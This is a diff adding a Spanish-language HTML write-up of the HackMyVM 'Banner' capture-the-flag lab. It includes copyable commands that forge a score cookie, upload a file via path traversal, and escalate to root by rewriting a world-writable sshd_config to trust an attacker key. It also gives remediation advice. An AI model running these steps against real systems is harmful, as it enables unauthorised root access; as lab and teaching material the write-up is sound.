@@ -1,0 +1,508 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Banner · HackMyVM · W4lterSec</title>
+<meta name="author" content="W4lterSec">
+<meta name="description" content="Banner de HackMyVM completada hasta root. Cookie del quiz, banner FTP dinámico, SSH y escalada mediante configuración de sshd escribible.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+/* Layout concept: single dark "phosphor terminal" world — a vertical kill-chain of
+   terminal cards over an animated grid field. Committed single (dark) theme. */
+:root{
+  --bg:#070b12;            /* blue-biased near-black */
+  --bg-2:#0b1220;
+  --surface:#0e1626;
+  --surface-2:#121d31;
+  --line:#1e2d44;
+  --fg:#d7e3f4;
+  --muted:#7f93b0;
+  --faint:#56688a;
+  --green:#3ff0a0;         /* phosphor accent */
+  --amber:#ffc24b;         /* secondary accent */
+  --magenta:#ff5c8a;       /* critical */
+  --cyan:#53d7ff;          /* info */
+  --glow: 0 0 0.4em rgba(63,240,160,.55);
+  color-scheme: dark;
+  --f-display:"Chakra Petch", ui-sans-serif, system-ui, sans-serif;
+  --f-body:"IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
+  --f-mono:"JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, monospace;
+}
+*{box-sizing:border-box}
+body{
+  margin:0;background:var(--bg);color:var(--fg);
+  font-family:var(--f-body);line-height:1.6;
+  -webkit-font-smoothing:antialiased;overflow-x:hidden;
+}
+#bgfx{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5}
+.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;
+  background:repeating-linear-gradient(to bottom,transparent 0 3px,rgba(0,0,0,.14) 3px 4px);
+  mix-blend-mode:multiply;opacity:.5}
+.wrap{position:relative;z-index:2;max-width:1000px;margin:0 auto;
+  padding-left:max(18px,env(safe-area-inset-left,0px));
+  padding-right:max(18px,env(safe-area-inset-right,0px));}
+a{color:var(--green);text-decoration:none}
+
+/* ---------- HERO ---------- */
+.hero{padding-block:72px 40px;text-align:center;position:relative}
+.kicker{font-family:var(--f-mono);font-size:.72rem;letter-spacing:.32em;text-transform:uppercase;
+  color:var(--green);opacity:.9;margin-bottom:18px;display:inline-flex;gap:.6em;align-items:center}
+.kicker .dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:var(--glow);
+  animation:pulse 1.8s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:.35;transform:scale(.8)}50%{opacity:1;transform:scale(1.25)}}
+h1.title{font-family:var(--f-display);font-weight:700;letter-spacing:.01em;
+  font-size:clamp(2.9rem,11vw,6rem);line-height:.95;margin:0;text-wrap:balance;
+  text-shadow:0 0 28px rgba(63,240,160,.18)}
+h1.title .glitch{position:relative;display:inline-block;color:var(--fg)}
+h1.title .glitch::before,h1.title .glitch::after{content:attr(data-t);position:absolute;left:0;top:0;
+  width:100%;overflow:hidden;clip-path:inset(0)}
+h1.title .glitch::before{color:var(--magenta);transform:translate(-2px,0);animation:gl1 3.2s infinite steps(2)}
+h1.title .glitch::after{color:var(--cyan);transform:translate(2px,0);animation:gl2 2.6s infinite steps(2)}
+@keyframes gl1{0%,92%,100%{clip-path:inset(0 0 100% 0)}93%{clip-path:inset(12% 0 60% 0)}96%{clip-path:inset(70% 0 8% 0)}}
+@keyframes gl2{0%,90%,100%{clip-path:inset(100% 0 0 0)}91%{clip-path:inset(40% 0 40% 0)}97%{clip-path:inset(8% 0 72% 0)}}
+.sub{font-family:var(--f-mono);color:var(--muted);margin-top:22px;font-size:clamp(.85rem,2.6vw,1rem);min-height:1.4em}
+.sub .cursor{display:inline-block;width:.6ch;background:var(--green);animation:blink 1s steps(1) infinite;margin-left:1px}
+@keyframes blink{50%{opacity:0}}
+.targetbar{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-top:30px}
+.chip{font-family:var(--f-mono);font-size:.76rem;border:1px solid var(--line);background:var(--surface);
+  padding:7px 13px;border-radius:999px;color:var(--muted);display:inline-flex;gap:8px;align-items:center}
+.chip b{color:var(--fg);font-weight:600}
+.chip .g{color:var(--green)}
+
+/* ---------- STATS ---------- */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:46px 0 10px}
+.stat{background:linear-gradient(180deg,var(--surface),var(--bg-2));border:1px solid var(--line);
+  border-radius:14px;padding:18px 16px;text-align:center;position:relative;overflow:hidden}
+.stat::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 80% at 50% -20%,rgba(63,240,160,.10),transparent 60%)}
+.stat .num{font-family:var(--f-display);font-weight:700;font-size:clamp(1.7rem,6vw,2.6rem);
+  color:var(--green);font-variant-numeric:tabular-nums;text-shadow:var(--glow)}
+.stat .lbl{font-family:var(--f-mono);font-size:.66rem;letter-spacing:.18em;text-transform:uppercase;color:var(--faint);margin-top:4px}
+
+/* ---------- SECTION ---------- */
+section{padding-block:30px}
+.sec-head{display:flex;align-items:baseline;gap:14px;margin:8px 0 22px;flex-wrap:wrap}
+.sec-head .idx{font-family:var(--f-mono);color:var(--green);font-size:.9rem;opacity:.8}
+.sec-head h2{font-family:var(--f-display);font-weight:600;font-size:clamp(1.3rem,4.6vw,2rem);margin:0;letter-spacing:.01em}
+.sec-head .rule{flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent);min-width:30px}
+.lead{color:var(--muted);max-width:68ch;margin:0 0 20px}
+
+/* ---------- KILL CHAIN ---------- */
+.chain{position:relative;margin-left:8px;padding-left:28px;
+  border-left:1px dashed var(--line)}
+.node{position:relative;margin-bottom:34px}
+.node::before{content:"";position:absolute;left:-36px;top:4px;width:15px;height:15px;border-radius:50%;
+  background:var(--bg);border:2px solid var(--green);box-shadow:var(--glow)}
+.node.crit::before{border-color:var(--magenta);box-shadow:0 0 .4em rgba(255,92,138,.6)}
+.node .ph{font-family:var(--f-mono);font-size:.72rem;letter-spacing:.2em;text-transform:uppercase;color:var(--faint)}
+.node h3{font-family:var(--f-display);font-weight:600;font-size:1.15rem;margin:3px 0 10px;color:var(--fg)}
+.node p{margin:0 0 12px;color:var(--muted);font-size:.95rem}
+.node p b{color:var(--fg)}
+
+/* terminal card */
+.term{background:var(--surface);border:1px solid var(--line);border-radius:12px;overflow:hidden;
+  box-shadow:0 18px 40px -24px rgba(0,0,0,.9)}
+.term .bar{display:flex;align-items:center;gap:8px;padding:9px 13px;background:var(--surface-2);border-bottom:1px solid var(--line)}
+.term .bar .b{width:11px;height:11px;border-radius:50%;background:#2b3b56}
+.term .bar .b.r{background:#ff5f57}.term .bar .b.y{background:#febc2e}.term .bar .b.g{background:#28c840}
+.term .bar .t{font-family:var(--f-mono);font-size:.7rem;color:var(--faint);margin-left:6px}
+.term .bar .copy{margin-left:auto;font-family:var(--f-mono);font-size:.66rem;color:var(--muted);
+  border:1px solid var(--line);background:var(--surface);border-radius:6px;padding:3px 9px;cursor:pointer;transition:.15s}
+.term .bar .copy:hover{color:var(--green);border-color:var(--green)}
+.term pre{margin:0;padding:14px 15px;overflow-x:auto;font-family:var(--f-mono);font-size:.82rem;line-height:1.6}
+.term code{font-family:inherit}
+.term .cmd{color:var(--fg)}
+.term .cmd::before{content:"$ ";color:var(--green)}
+.term .out{color:var(--muted)}
+.term .hl{color:var(--amber)}
+.term .ok{color:var(--green)}
+.term .bad{color:var(--magenta)}
+.term .cm{color:var(--faint)}
+
+/* loot / callout */
+.loot{display:flex;gap:11px;align-items:flex-start;margin-top:12px;padding:11px 14px;border-radius:10px;
+  background:linear-gradient(90deg,rgba(63,240,160,.08),transparent);border:1px solid rgba(63,240,160,.25)}
+.loot .ic{font-size:1.05rem;line-height:1.4}
+.loot .tx{font-family:var(--f-mono);font-size:.82rem;color:var(--fg)}
+.loot .tx b{color:var(--green)}
+
+/* ---------- FLAGS ---------- */
+.flags{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:6px}
+.flagcard{position:relative;border-radius:14px;padding:22px 20px;overflow:hidden;
+  border:1px solid var(--line);background:linear-gradient(180deg,var(--surface),var(--bg-2))}
+.flagcard.user{border-color:rgba(83,215,255,.3)}
+.flagcard.root{border-color:rgba(255,92,138,.35)}
+.flagcard .tag{font-family:var(--f-mono);font-size:.68rem;letter-spacing:.24em;text-transform:uppercase;color:var(--faint)}
+.flagcard .who{font-family:var(--f-display);font-weight:700;font-size:1.35rem;margin:2px 0 14px}
+.flagcard.user .who{color:var(--cyan)}.flagcard.root .who{color:var(--magenta)}
+.flagcard .fl{font-family:var(--f-mono);font-size:.82rem;word-break:break-all;color:var(--green);
+  background:var(--bg);border:1px dashed var(--line);border-radius:8px;padding:11px 12px;cursor:pointer}
+.flagcard .fl small{display:block;color:var(--faint);font-size:.6rem;letter-spacing:.2em;margin-top:6px}
+.flagcard .glowline{position:absolute;inset:auto 0 0 0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:.7}
+
+/* ---------- VULN TABLE ---------- */
+.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:12px}
+table{border-collapse:collapse;width:100%;min-width:560px;font-size:.88rem}
+th,td{text-align:left;padding:12px 14px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--f-mono);font-size:.66rem;letter-spacing:.16em;text-transform:uppercase;color:var(--faint);background:var(--surface-2)}
+tr:last-child td{border-bottom:0}
+td b{color:var(--fg)}
+.sev{font-family:var(--f-mono);font-size:.64rem;letter-spacing:.1em;text-transform:uppercase;
+  padding:3px 9px;border-radius:999px;white-space:nowrap;display:inline-block}
+.sev.c{background:rgba(255,92,138,.14);color:var(--magenta);border:1px solid rgba(255,92,138,.4)}
+.sev.h{background:rgba(255,194,75,.14);color:var(--amber);border:1px solid rgba(255,194,75,.4)}
+.sev.m{background:rgba(83,215,255,.12);color:var(--cyan);border:1px solid rgba(83,215,255,.35)}
+
+/* ---------- FIX GRID ---------- */
+.fixgrid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fix{border:1px solid var(--line);border-radius:12px;padding:16px 16px;background:var(--surface)}
+.fix .n{font-family:var(--f-mono);color:var(--green);font-size:.8rem}
+.fix h4{font-family:var(--f-display);font-weight:600;margin:6px 0 6px;font-size:1rem}
+.fix p{margin:0;color:var(--muted);font-size:.87rem}
+.fix code{font-family:var(--f-mono);font-size:.8rem;color:var(--amber);background:var(--bg);padding:1px 5px;border-radius:4px}
+
+footer{padding-block:40px 60px;text-align:center;color:var(--faint);font-family:var(--f-mono);font-size:.74rem}
+footer .b{color:var(--muted)}
+
+/* reveal: visible at rest, gentle entrance enhancement */
+.rv{opacity:1}
+@media (prefers-reduced-motion:no-preference){
+  .js .rv{opacity:0;transform:translateY(16px);transition:opacity .6s ease,transform .6s cubic-bezier(.2,.7,.2,1)}
+  .js .rv.in{opacity:1;transform:none}
+}
+@media (max-width:620px){
+  .stats{grid-template-columns:1fr 1fr}
+  .flags,.fixgrid{grid-template-columns:1fr}
+}
+@media (prefers-reduced-motion:reduce){
+  h1.title .glitch::before,h1.title .glitch::after{display:none}
+  .kicker .dot{animation:none}
+}
+
+.portfolio-nav{display:flex;flex-wrap:wrap;align-items:center;gap:10px 18px;margin-bottom:28px;font-family:var(--f-mono);font-size:12px}
+.portfolio-nav a,.machine-links a{color:var(--cyan);text-decoration:none}
+.portfolio-nav a:hover,.machine-links a:hover{text-decoration:underline}
+.portfolio-nav span{color:var(--muted)}
+.machine-links{margin-top:24px;border:1px solid var(--line);border-radius:14px;padding:18px 20px;font-family:var(--f-mono);font-size:13px}
+.machine-links p{margin:8px 0 0;color:var(--muted);font-size:12px}
+</style>
+</head>
+<body>
+
+
+<canvas id="bgfx"></canvas>
+<div class="scanlines" aria-hidden="true"></div>
+
+<div class="wrap">
+
+  <!-- HERO -->
+  <header class="hero">
+    <nav class="portfolio-nav" aria-label="Navegación del portfolio">
+      <a href="https://github.com/W4lterSec/cybersecurity-labs/tree/main/red-team">← Red Team</a>
+      <span>W4lterSec · HackMyVM · Completada hasta root</span>
+      <a href="https://hackmyvm.eu/machine/Banner" target="_blank" rel="noopener noreferrer">Máquina oficial ↗</a>
+    </nav>
+    <div class="kicker"><span class="dot"></span> Boot2Root · Autorizado · Entorno local</div>
+    <h1 class="title"><span class="glitch" data-t="BANNER">BANNER</span></h1>
+    <div class="sub" id="typed">recon → web → ftp → ssh → root</div>
+    <div class="targetbar">
+      <span class="chip">TARGET <b>192.168.1.36</b></span>
+      <span class="chip">OS <b>Debian 10 · buster</b></span>
+      <span class="chip">PORTS <b class="g">21 · 22 · 8080</b></span>
+      <span class="chip">RESULT <b class="g">ROOT ✓</b></span>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><div class="num" data-to="3">0</div><div class="lbl">Puertos abiertos</div></div>
+      <div class="stat"><div class="num" data-to="5">0</div><div class="lbl">Vulnerabilidades</div></div>
+      <div class="stat"><div class="num" data-to="2">0</div><div class="lbl">Flags capturadas</div></div>
+      <div class="stat"><div class="num" data-to="0" data-txt="ROOT">0</div><div class="lbl">Privilegio final</div></div>
+    </div>
+  </header>
+
+  <!-- CADENA -->
+  <section>
+    <div class="sec-head rv"><span class="idx">//</span><h2>Cadena de explotación</h2><span class="rule"></span></div>
+
+    <div class="chain">
+
+      <!-- 1 recon -->
+      <div class="node rv">
+        <div class="ph">Fase 01 · Reconocimiento</div>
+        <h3>Barrido de puertos y servicios</h3>
+        <p>Tres servicios expuestos. La web en 8080 es una app <b>Flask/Werkzeug</b> (quiz de ciberseguridad) corriendo en modo <b>debug</b>.</p>
+        <div class="term">
+          <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">nmap</span><button class="copy" data-copy="nmap -p- --min-rate 2000 -T4 -Pn 192.168.1.36&#10;nmap -sV -sC -p21,22,8080 -Pn 192.168.1.36">copy</button></div>
+<pre><code><span class="cmd">nmap -sV -sC -p21,22,8080 -Pn 192.168.1.36</span>
+<span class="out">21/tcp   open  ftp     <span class="hl">vsftpd 2.0.8 or later</span></span>
+<span class="out">22/tcp   open  ssh     <span class="hl">OpenSSH 8.4p1 Debian</span></span>
+<span class="out">8080/tcp open  http    <span class="hl">Werkzeug httpd 3.1.6 (Python 3.9.2)</span></span>
+<span class="out">MAC Address: 08:00:27:BE:24:F8 <span class="cm">(Oracle VirtualBox)</span></span></code></pre>
+        </div>
+      </div>
+
+      <!-- 2 web -->
+      <div class="node rv">
+        <div class="ph">Fase 02 · Web · Lógica de negocio</div>
+        <h3>Bypass de puntuación por cookie</h3>
+        <p>El servidor confía en la cookie <b>user_score</b> del cliente. Se falsea a <b>990</b> y, con una respuesta correcta, se alcanzan los 1000 puntos que liberan la flag.</p>
+        <div class="term">
+          <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">curl · /api/submit</span><button class="copy" data-copy="curl -s -i -X POST http://192.168.1.36:8080/api/submit -H 'Content-Type: application/json' -H 'Cookie: user_score=990' -d '{&quot;id&quot;:1,&quot;answer&quot;:&quot;A&quot;}'">copy</button></div>
+<pre><code><span class="cmd">curl -i -X POST .../api/submit -H 'Cookie: user_score=990' \</span>
+<span class="cmd">     -d '{"id":1,"answer":"A"}'</span>
+<span class="out">Set-Cookie: user_score=1000; ...</span>
+<span class="out">Set-Cookie: <span class="ok">flag=111:banner</span>; ...</span>
+<span class="out">{ "score": 1000, "total": 1000 }</span></code></pre>
+        </div>
+        <div class="loot"><span class="ic">🩻</span><span class="tx">Botín: <b>111:banner</b> → credenciales FTP</span></div>
+      </div>
+
+      <!-- 3 ftp banner -->
+      <div class="node rv">
+        <div class="ph">Fase 03 · FTP · Esteganografía</div>
+        <h3>El acróstico del banner dinámico</h3>
+        <p>El fichero <b>hint</b> pregunta <i>"¿sabes qué es un banner?"</i>. El banner de vsftpd rota 5 frases cada ~60&nbsp;s; las <b>iniciales</b> de las palabras resaltadas forman un mensaje.</p>
+        <div class="term">
+          <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">banner · acróstico temporal</span></div>
+<pre><code><span class="out">Wild  Elephants  Love          <span class="cm">→ W E L</span></span>
+<span class="out">Clever  Owls  Make             <span class="cm">→ C O M</span></span>
+<span class="out">Elephants  :  Mice             <span class="cm">→ E : M</span></span>
+<span class="out">Amazing  Zebras  Eat           <span class="cm">→ A Z E</span></span>
+<span class="out">Snakes  Eat  Crickets          <span class="cm">→ S E C</span></span>
+<span class="ok">──────────────────────────────────────────</span>
+<span class="ok">= W E L C O M E : M A Z E S E C</span></code></pre>
+        </div>
+        <div class="loot"><span class="ic">🧩</span><span class="tx"><b>WELCOME:MAZESEC</b> → usuario <b>welcome</b> / pass <b>mazesec</b> <span class="cm">(¡en minúsculas!)</span></span></div>
+      </div>
+
+      <!-- 4 ssh user -->
+      <div class="node rv">
+        <div class="ph">Fase 04 · SSH · Acceso inicial</div>
+        <h3>Shell como welcome → User flag</h3>
+        <div class="term">
+          <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">ssh welcome@192.168.1.36</span><button class="copy" data-copy="ssh welcome@192.168.1.36   # mazesec">copy</button></div>
+<pre><code><span class="cmd">ssh welcome@192.168.1.36 <span class="cm"># mazesec</span></span>
+<span class="out">uid=1000(welcome) gid=1000(welcome)</span>
+<span class="cmd">cat /home/welcome/user.txt</span>
+<span class="ok">flag{user-509fe78ad30da7792f576cd3a91a57fc}</span></code></pre>
+        </div>
+      </div>
+
+      <!-- 5 privesc -->
+      <div class="node crit rv">
+        <div class="ph">Fase 05 · Escalada de privilegios</div>
+        <h3>sshd_config world-writable + sudo service</h3>
+        <p><code style="font-family:var(--f-mono);color:var(--amber)">/etc/ssh/sshd_config</code> tiene permisos <b>0666</b> y <b>welcome</b> puede reiniciar sshd como root. Se habilita login de root por clave propia.</p>
+        <div class="term">
+          <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">privesc · root</span><button class="copy" data-copy="printf 'ssh-ed25519 AAAA... pwn\n' > /tmp/.rootkey&#10;printf 'PermitRootLogin yes\nPubkeyAuthentication yes\nStrictModes no\nAuthorizedKeysFile /tmp/.rootkey\n' | cat - /etc/ssh/sshd_config > /tmp/n && cat /tmp/n > /etc/ssh/sshd_config&#10;sudo -n /sbin/service sshd restart">copy</button></div>
+<pre><code><span class="cmd">sudo -l</span>
+<span class="out">(root) NOPASSWD: <span class="hl">/sbin/service sshd restart</span></span>
+<span class="cmd">ls -la /etc/ssh/sshd_config</span>
+<span class="out"><span class="bad">-rw-rw-rw-</span> 1 root root  sshd_config  <span class="cm"># 0666!</span></span>
+<span class="cmd">printf 'PermitRootLogin yes\n...\nAuthorizedKeysFile /tmp/.rootkey\n' \</span>
+<span class="cmd">  | cat - /etc/ssh/sshd_config > /tmp/n && cat /tmp/n > /etc/ssh/sshd_config</span>
+<span class="cmd">sudo -n /sbin/service sshd restart</span>
+<span class="cmd">ssh -i rootkey root@192.168.1.36</span>
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
+        </div>
+        <div class="loot"><span class="ic">🏴</span><span class="tx">root · <b>flag{root-fc7fb423367bb7fccb411758f06f857a}</b></span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- FLAGS -->
+  <section>
+    <div class="sec-head rv"><span class="idx">//</span><h2>Flags capturadas</h2><span class="rule"></span></div>
+    <div class="flags">
+      <div class="flagcard user rv">
+        <div class="tag">Acceso · uid 1000</div>
+        <div class="who">USER</div>
+        <div class="fl scramble" data-final="flag{user-509fe78ad30da7792f576cd3a91a57fc}" title="Clic para copiar">flag{user-509fe78ad30da7792f576cd3a91a57fc}<small>CLIC PARA COPIAR</small></div>
+        <div class="glowline"></div>
+      </div>
+      <div class="flagcard root rv">
+        <div class="tag">Acceso · uid 0</div>
+        <div class="who">ROOT</div>
+        <div class="fl scramble" data-final="flag{root-fc7fb423367bb7fccb411758f06f857a}" title="Clic para copiar">flag{root-fc7fb423367bb7fccb411758f06f857a}<small>CLIC PARA COPIAR</small></div>
+        <div class="glowline"></div>
+      </div>
+    </div>
+  </section>
+
+  <aside class="machine-links" id="maquina-oficial">
+      <a href="https://hackmyvm.eu/machine/Banner" target="_blank" rel="noopener noreferrer">🔗 Abrir Banner en HackMyVM ↗</a>
+      <p>Writeup de W4lterSec · Flags de usuario y root capturadas</p>
+    </aside>
+
+  <!-- ALT PATH -->
+  <section>
+    <div class="sec-head rv"><span class="idx">//</span><h2>Vía alternativa · RCE web</h2><span class="rule"></span></div>
+    <p class="lead rv">El endpoint oculto <b style="color:var(--fg)">/api/upload</b> guarda el fichero con su nombre crudo (<code style="font-family:var(--f-mono);color:var(--amber)">file.save(f'{BASE_DIR}/uploads/{filename}')</code>) y el servicio corre <b style="color:var(--fg)">como root</b>. El path traversal da escritura arbitraria; su filesystem está montado solo-lectura, así que se usó como <b style="color:var(--fg)">oráculo</b> para mapear el sistema y localizar flags y usuarios antes de tener shell.</p>
+    <div class="term rv">
+      <div class="bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">path traversal</span><button class="copy" data-copy="curl -s -X POST http://192.168.1.36:8080/api/upload -F 'file=@x.txt;filename=../../../../tmp/pwned.txt'">copy</button></div>
+<pre><code><span class="cmd">curl -X POST .../api/upload -F 'file=@x;filename=<span class="hl">../../../../tmp/pwned.txt</span>'</span>
+<span class="out">{ "filename": "../../../../tmp/pwned.txt", <span class="ok">"success": true</span> }</span>
+<span class="cm"># debug=True → filtra código fuente y /opt/ctf-game/data/users.db en las trazas</span></code></pre>
+    </div>
+  </section>
+
+  <!-- VULNS -->
+  <section>
+    <div class="sec-head rv"><span class="idx">//</span><h2>Vulnerabilidades</h2><span class="rule"></span></div>
+    <div class="tablewrap rv">
+      <table>
+        <thead><tr><th>Severidad</th><th>Hallazgo</th><th>Impacto</th></tr></thead>
+        <tbody>
+          <tr><td><span class="sev h">Alta</span></td><td><b>Puntuación confiada en cookie</b></td><td>Bypass total de la lógica del quiz.</td></tr>
+          <tr><td><span class="sev m">Media</span></td><td><b>Credenciales embebidas</b> (web + banner)</td><td>Fuga de credenciales FTP y SSH.</td></tr>
+          <tr><td><span class="sev c">Crítica</span></td><td><b>Path traversal en /api/upload</b> (como root)</td><td>Escritura arbitraria de ficheros.</td></tr>
+          <tr><td><span class="sev h">Alta</span></td><td><b>Flask como root + debug=True</b></td><td>Fuga de código fuente; superficie de RCE.</td></tr>
+          <tr><td><span class="sev c">Crítica</span></td><td><b>sshd_config 0666 + sudo service</b></td><td>Escalada directa a root.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- FIXES -->
+  <section>
+    <div class="sec-head rv"><span class="idx">//</span><h2>Remediación</h2><span class="rule"></span></div>
+    <div class="fixgrid">
+      <div class="fix rv"><div class="n">01</div><h4>Estado en servidor</h4><p>Guardar la puntuación en sesión firmada o BD; nunca confiar en cookies del cliente.</p></div>
+      <div class="fix rv"><div class="n">02</div><h4>Sin credenciales embebidas</h4><p>No distribuir credenciales por banners, cookies ni respuestas de API.</p></div>
+      <div class="fix rv"><div class="n">03</div><h4>Subida segura</h4><p><code>secure_filename()</code> y validar la ruta canónica dentro del directorio permitido.</p></div>
+      <div class="fix rv"><div class="n">04</div><h4>Mínimo privilegio</h4><p>Ejecutar Flask como usuario sin privilegios y con <code>debug=False</code> en producción.</p></div>
+      <div class="fix rv"><div class="n">05</div><h4>Permisos de config</h4><p><code>chmod 644</code> y <code>chown root:root</code> sobre <code>/etc/ssh/sshd_config</code>.</p></div>
+      <div class="fix rv"><div class="n">06</div><h4>sudo endurecido</h4><p>Evitar reglas que, junto a config escribible, permitan recargar servicios como root.</p></div>
+    </div>
+  </section>
+
+  <footer class="rv">
+    <div class="b">Writeup generado tras una prueba de penetración autorizada en entorno local.</div>
+    192.168.1.36 · Banner · pwned clean &amp; restored
+  </footer>
+
+</div>
+
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement; root.classList.add('js');
+  var reduce=window.matchMedia&&window.matchMedia('(prefers-reduced-motion:reduce)').matches;
+
+  /* typed subtitle */
+  var lines=["root@kali:~# recon → web → ftp → ssh → root",
+             "cadena de 5 vulnerabilidades · user + root capturados"];
+  var el=document.getElementById('typed');
+  if(el){
+    if(reduce){el.textContent=lines[0];}
+    else{
+      var li=0,ci=0;
+      el.innerHTML='<span id="tt"></span><span class="cursor">&nbsp;</span>';
+      var tt=document.getElementById('tt');
+      (function type(){
+        var s=lines[li];
+        if(ci<=s.length){tt.textContent=s.slice(0,ci++);setTimeout(type,42);}
+        else{setTimeout(function(){ (function del(){ if(ci>0){tt.textContent=s.slice(0,--ci);setTimeout(del,22);} else{li=(li+1)%lines.length;setTimeout(type,180);} })(); },2600);}
+      })();
+    }
+  }
+
+  /* count-up stats */
+  function countUp(node){
+    var to=parseFloat(node.getAttribute('data-to'))||0, txt=node.getAttribute('data-txt');
+    if(reduce){node.textContent=txt||to;return;}
+    var start=performance.now(),dur=1100;
+    (function step(now){
+      var p=Math.min(1,(now-start)/dur),e=1-Math.pow(1-p,3);
+      node.textContent=txt&&p>=1?txt:Math.round(to*e);
+      if(p<1)requestAnimationFrame(step); else node.textContent=txt||to;
+    })(start);
+  }
+
+  /* scramble flags once visible */
+  var CH="ABCDEF0123456789abcdef{}-_";
+  function scramble(node){
+    var final=node.getAttribute('data-final'); if(!final)return;
+    var small=node.querySelector('small');
+    if(reduce){return;}
+    var frame=0,total=28;
+    (function run(){
+      var out="";
+      for(var i=0;i<final.length;i++){
+        if(i< (frame/total)*final.length){out+=final[i];}
+        else{out+=CH[(Math.random()*CH.length)|0];}
+      }
+      node.firstChild.textContent=out;
+      if(frame++<total){setTimeout(run,36);} else {node.firstChild.textContent=final;}
+    })();
+  }
+
+  /* reveal + trigger one-shot effects */
+  var seen=new WeakSet();
+  function fire(node){
+    if(seen.has(node))return; seen.add(node);
+    node.querySelectorAll?node.querySelectorAll('[data-to]').forEach(countUp):0;
+    if(node.matches&&node.matches('[data-to]'))countUp(node);
+    node.querySelectorAll?.('.scramble').forEach(scramble);
+    if(node.classList&&node.classList.contains('scramble'))scramble(node);
+  }
+  var io=('IntersectionObserver'in window)?new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); fire(e.target); io.unobserve(e.target);} });
+  },{threshold:.15,rootMargin:'0px 0px -8% 0px'}):null;
+
+  document.querySelectorAll('.rv').forEach(function(n){ if(io)io.observe(n); else {n.classList.add('in');fire(n);} });
+  // hero stats & above-the-fold fire immediately
+  document.querySelectorAll('.stat .num').forEach(countUp);
+
+  /* copy buttons */
+  function flash(btn,txt){var o=btn.textContent;btn.textContent=txt;setTimeout(function(){btn.textContent=o;},1200);}
+  document.querySelectorAll('.copy').forEach(function(b){
+    b.addEventListener('click',function(){
+      var t=(b.getAttribute('data-copy')||'').replace(/\r/g,'');
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(t).then(function(){flash(b,'copied ✓');},function(){flash(b,'select');});
+      } else flash(b,'select');
+    });
+  });
+  document.querySelectorAll('.fl').forEach(function(f){
+    f.addEventListener('click',function(){
+      var t=f.getAttribute('data-final')||f.firstChild.textContent;
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).catch(function(){});}
+      var s=f.querySelector('small'); if(s){var o=s.textContent;s.textContent='COPIADO ✓';setTimeout(function(){s.textContent=o;},1200);}
+    });
+  });
+
+  /* animated grid background */
+  var cv=document.getElementById('bgfx'); if(cv&&!reduce){
+    var ctx=cv.getContext('2d'),W,H,dpr=Math.min(2,window.devicePixelRatio||1),t=0;
+    var pts=[];
+    function resize(){W=cv.width=innerWidth*dpr;H=cv.height=innerHeight*dpr;cv.style.width=innerWidth+'px';cv.style.height=innerHeight+'px';
+      pts=[];var n=Math.min(46,Math.round(innerWidth/30));
+      for(var i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.12*dpr,vy:(Math.random()-.5)*.12*dpr});
+    }
+    resize();addEventListener('resize',resize);
+    function draw(){
+      t+=.006;ctx.clearRect(0,0,W,H);
+      var grid=46*dpr,off=(t*10)%grid;
+      ctx.strokeStyle='rgba(30,45,68,.35)';ctx.lineWidth=1;
+      for(var x=off;x<W;x+=grid){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();}
+      for(var y=off;y<H;y+=grid){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke();}
+      for(var i=0;i<pts.length;i++){var p=pts[i];p.x+=p.vx;p.y+=p.vy;
+        if(p.x<0)p.x+=W;if(p.x>W)p.x-=W;if(p.y<0)p.y+=H;if(p.y>H)p.y-=H;
+        for(var j=i+1;j<pts.length;j++){var q=pts[j],dx=p.x-q.x,dy=p.y-q.y,d=dx*dx+dy*dy,md=(120*dpr)*(120*dpr);
+          if(d<md){var a=.14*(1-d/md);ctx.strokeStyle='rgba(63,240,160,'+a+')';ctx.beginPath();ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);ctx.stroke();}}
+        ctx.fillStyle='rgba(63,240,160,.5)';ctx.beginPath();ctx.arc(p.x,p.y,1.3*dpr,0,6.283);ctx.fill();
+      }
+      requestAnimationFrame(draw);
+    }
+    draw();
+  }
+})();
+</script>
+
+</body>
+</html>
